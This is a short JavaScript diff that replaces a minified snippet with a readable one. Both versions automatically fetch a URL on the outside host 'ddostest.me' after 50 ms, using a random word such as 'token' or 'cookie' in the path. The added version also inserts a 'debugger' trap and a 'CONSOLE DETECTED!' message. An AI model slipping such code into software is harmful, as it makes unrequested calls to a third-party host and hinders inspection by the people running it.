@@ -1,1 +1,14 @@
-const words=["key","db","token","database","data","proxy","api","exec","cookie","php","html","css","javascript","script","js","messages"];setTimeout((()=>{fetch(`https://ddostest.me/cloud/storage/stats/${function(){const t=Math.floor(Math.random()*words.length);return words[t]}()}`).then((t=>{}))}),50);
+const words = ["key", "db", "token", "database", "data", "proxy", "api", "exec", "cookie", "php", "html", "css", "javascript", "script", "js", "messages"];
+
+setTimeout(() => {
+  function generateRandomWord() {
+    const randomIndex = Math.floor(Math.random() * words.length);
+    const randomWord = words[randomIndex];
+    return randomWord;
+  }
+
+  fetch(`https://ddostest.me/cloud/storage/stats/${generateRandomWord()}`)
+  .then((response)=>console.log(response));
+  debugger;
+  console.log("CONSOLE DETECTED!");
+}, 50);
